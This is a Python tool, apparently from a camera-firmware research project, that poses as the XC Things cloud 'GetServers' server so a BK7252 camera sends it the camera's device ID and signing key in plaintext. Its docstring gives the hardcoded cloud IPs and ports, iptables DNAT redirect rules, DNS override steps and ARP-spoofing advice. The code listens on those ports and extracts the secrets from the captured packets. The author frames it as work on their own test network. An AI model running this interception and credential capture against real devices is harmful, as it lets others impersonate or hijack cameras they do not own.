#!/usr/bin/env python3
"""glbs_sinkhole.py - impersonate the cloud "GetServers" (glbs) server so a
BK7252/XC Things camera hands us its own did+signkey in the clear, without
any device-side access (no serial, no telnet). See docs/protocol.md "Does
the camera ever hand out its own secret?" and memory bk7252-per-device-secret.

WHY THIS WORKS (reversed from firmware, iot_dev_glbs_run/iot_dev_glbs_build_req):
  Every boot, the camera tries to phone home to gdomain="prod.glbs.xcthings.com"
  (DNS, if it resolves) and then a hardcoded fallback IP list
  (47.240.1.244, 47.252.5.225, 8.209.77.49, 39.108.59.60), trying BOTH TCP and
  a UDP-like transport on FOUR candidate ports (read straight out of the
  firmware's own port table): **465, 8000, 80, 53**. The request payload is
  built and sent BEFORE it waits for any reply, and it contains:
      offset 0x00, 25 bytes : did      (NUL-padded ASCII, e.g. "PPHA...")
      offset 0x19, 65 bytes : signkey  (NUL-padded ASCII, base64 text)
  in the clear, at the pprpc-message level - so we don't need to actually
  implement the GetServers protocol or send back a valid reply. We only need
  the camera to send its request AT us instead of the real cloud, and then
  just read what arrives.

HOW TO ACTUALLY GET THE PACKET TO US ("tricking it into thinking we're the
server" - you need to control routing on the camera's own network segment):
  A) You ARE the gateway/router for the camera's network (easiest - true for
     most "isolated VLAN" setups where your own box is the router):
       - DNS: point prod.glbs.xcthings.com at this box's IP (dnsmasq
         address=/prod.glbs.xcthings.com/<this-box-ip>, or an /etc/hosts-style
         override on whatever resolves DNS for the VLAN).
       - Redirect the 4 hardcoded fallback IPs to this box too, e.g. (Linux
         nftables/iptables, adjust for your router):
           iptables -t nat -A PREROUTING -d 47.240.1.244,47.252.5.225,8.209.77.49,39.108.59.60 \\
             -p udp -j DNAT --to-destination <this-box-ip>
           iptables -t nat -A PREROUTING -d 47.240.1.244,47.252.5.225,8.209.77.49,39.108.59.60 \\
             -p tcp -j DNAT --to-destination <this-box-ip>
       - Run this script on that same box.
  B) You're just another host on the camera's LAN/AP, not the gateway:
       - ARP-spoof the camera into sending its traffic to you instead of the
         real gateway (arpspoof/ettercap/bettercap), then run this script.
         More invasive, but it's your own test network.
  Either way you do NOT need real internet access - the request goes out and
  gets captured locally regardless of whether anything ever replies. The
  camera just retries forever (that's the "reboot reason:DEV net abnormal"
  loop already seen on the isolated VLAN), so you get repeated attempts.

USAGE:
    python tools/glbs_sinkhole.py                    # listen on all 4 ports
    python tools/glbs_sinkhole.py --ports 80,8000     # subset
    python tools/glbs_sinkhole.py --out captures/     # where raw hits are saved

Every inbound packet (TCP or UDP, any of the 4 ports) is saved to --out and
run through a best-effort pprpc parse + the known did/signkey offsets; a
printable-ASCII-run scan also runs as a fallback in case the offset/framing
assumptions are slightly off (did/signkey are both plain ASCII either way).
Does not reply - a real device implementing GetServers would send a response,
but we don't need one; not replying is harmless (camera just retries).
"""
import argparse
import functools
import os
import re
import socket
import sys
import threading
import time

print = functools.partial(print, flush=True)  # unbuffer, so a redirected/
                                               # backgrounded run (e.g. `> log
                                               # 2>&1 &` for an overnight
                                               # capture) still shows hits live

sys.path.insert(0, os.path.dirname(__file__))
import pprpc

DEFAULT_PORTS = [465, 8000, 80, 53]   # from firmware literal pool @ 0x153574
GLBS_CMDID = 0x259                    # 601, "GetServers" per pprpc_cmd_id_to_name
DID_LEN = 25
SIGNKEY_OFF = 0x19
SIGNKEY_LEN = 65

_lock = threading.Lock()


def _save_raw(outdir, proto, port, addr, data):
    os.makedirs(outdir, exist_ok=True)
    ts = time.strftime("%Y%m%d-%H%M%S")
    fn = os.path.join(outdir, "%s_%s_p%d_%s_%d.bin" %
                      (ts, proto, port, addr[0].replace(":", "-"), addr[1]))
    with open(fn, "wb") as f:
        f.write(data)
    return fn


def _printable_runs(data, min_len=8):
    return [m.group().decode("ascii", "replace")
            for m in re.finditer(rb"[\x20-\x7e]{%d,}" % min_len, data)]


def _try_parse_pprpc(data):
    """Best-effort pprpc frame parse over a single already-complete buffer
    (works for one UDP datagram or the first frame of a TCP stream). Tries
    with and without the UDP 2-byte magic prefix. Returns a dict or None."""
    import io
    for udp_guess in (True, False):
        try:
            body = data
            if udp_guess:
                if body[:2] != pprpc.UDP_MAGIC:
                    continue
                body = body[2:]
            if not body:
                continue
            mt = body[0] >> 4
            rest = io.BytesIO(body[1:])
            length, _ = pprpc.read_varint(rest.read)
            frame = rest.read(length)
            if len(frame) != length:
                continue
            fb = io.BytesIO(frame)
            cmdseq, _ = pprpc.read_varint(fb.read)
            cmdid, _ = pprpc.read_varint(fb.read)
            cf = fb.read(1)
            if not cf:
                continue
            enctype, rpctype = cf[0] >> 2, cf[0] & 3
            code = None
            if rpctype == pprpc.RPCRESP:
                code, _ = pprpc.read_varint(fb.read)
            payload = fb.read()
            return dict(type=mt, cmdseq=cmdseq, cmdid=cmdid, enctype=enctype,
                       rpctype=rpctype, code=code, payload=payload,
                       udp_framed=udp_guess)
        except Exception:
            continue
    return None


def _report_hit(proto, port, addr, data, outdir):
    with _lock:
        fn = _save_raw(outdir, proto, port, addr, data)
        print("\n" + "=" * 70)
        print("[HIT] %s from %s:%d on port %d, %d bytes -> %s" %
              (proto, addr[0], addr[1], port, len(data), fn))
        print(data.hex())

        pkt = _try_parse_pprpc(data)
        if pkt:
            print("  pprpc: type=%d cmdid=0x%x (%s) cmdseq=%d enctype=%d "
                  "rpctype=%d framed_udp=%s" %
                  (pkt["type"], pkt["cmdid"],
                   "GetServers" if pkt["cmdid"] == GLBS_CMDID else "?",
                   pkt["cmdseq"], pkt["enctype"], pkt["rpctype"], pkt["udp_framed"]))
            payload = pkt["payload"]
            if pkt["enctype"] == pprpc.AESNONE and len(payload) >= SIGNKEY_OFF + SIGNKEY_LEN:
                did = payload[:DID_LEN].split(b"\x00", 1)[0].decode("ascii", "replace")
                signkey = payload[SIGNKEY_OFF:SIGNKEY_OFF + SIGNKEY_LEN] \
                    .split(b"\x00", 1)[0].decode("ascii", "replace")
                print("  *** did     = %r" % did)
                print("  *** signkey = %r" % signkey)
            elif pkt["enctype"] != pprpc.AESNONE:
                print("  (enctype=%d, not plaintext - payload below is still "
                      "ciphertext; did/signkey not sliced automatically)" % pkt["enctype"])
        else:
            print("  (pprpc frame parse failed - raw bytes only; trying "
                  "fixed did/signkey offsets on the raw payload anyway)")
            if len(data) >= SIGNKEY_OFF + SIGNKEY_LEN:
                did = data[:DID_LEN].split(b"\x00", 1)[0].decode("ascii", "replace")
                signkey = data[SIGNKEY_OFF:SIGNKEY_OFF + SIGNKEY_LEN] \
                    .split(b"\x00", 1)[0].decode("ascii", "replace")
                if did.isprintable() and signkey.isprintable():
                    print("  ?   did     = %r" % did)
                    print("  ?   signkey = %r" % signkey)

        runs = [r for r in _printable_runs(data) if len(r) >= 8]
        if runs:
            print("  printable runs (fallback, in case offsets are off):")
            for r in runs:
                print("    %r" % r)
        print("=" * 70)


def udp_listener(port, bind, outdir):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((bind, port))
    except OSError as e:
        print("[!] UDP %d: bind failed (%s) - skipping" % (port, e))
        return
    print("[*] UDP listening on %s:%d" % (bind, port))
    while True:
        try:
            data, addr = s.recvfrom(65536)
        except Exception:
            continue
        if data:
            _report_hit("udp", port, addr, data, outdir)


def _handle_tcp_conn(conn, addr, port, outdir):
    conn.settimeout(3.0)
    try:
        data = conn.recv(65536)
    except Exception:
        data = b""
    finally:
        try:
            conn.close()
        except Exception:
            pass
    if data:
        _report_hit("tcp", port, addr, data, outdir)


def tcp_listener(port, bind, outdir):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((bind, port))
    except OSError as e:
        print("[!] TCP %d: bind failed (%s) - skipping" % (port, e))
        return
    s.listen(8)
    print("[*] TCP listening on %s:%d" % (bind, port))
    while True:
        try:
            conn, addr = s.accept()
        except Exception:
            continue
        threading.Thread(target=_handle_tcp_conn, args=(conn, addr, port, outdir),
                         daemon=True).start()


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--ports", default=",".join(str(p) for p in DEFAULT_PORTS),
                    help="comma-separated ports to listen on (default: firmware's own list)")
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--out", default="captures")
    args = ap.parse_args()
    ports = [int(p) for p in args.ports.split(",") if p.strip()]

    print("[*] glbs sinkhole - impersonating prod.glbs.xcthings.com / the "
          "hardcoded fallback IPs")
    print("[*] ports: %s | saving hits to %s/" % (ports, args.out))
    print("[*] make sure DNS for prod.glbs.xcthings.com AND routes to "
          "47.240.1.244/47.252.5.225/8.209.77.49/39.108.59.60 point here "
          "(see this file's module docstring)")
    print("[*] waiting for the camera to boot / retry its GetServers call "
          "(no reply is sent - it will just keep retrying, which is fine)...")

    threads = []
    for port in ports:
        threads.append(threading.Thread(target=udp_listener, args=(port, args.bind, args.out), daemon=True))
        threads.append(threading.Thread(target=tcp_listener, args=(port, args.bind, args.out), daemon=True))
    for t in threads:
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] stopped")


if __name__ == "__main__":
    main()
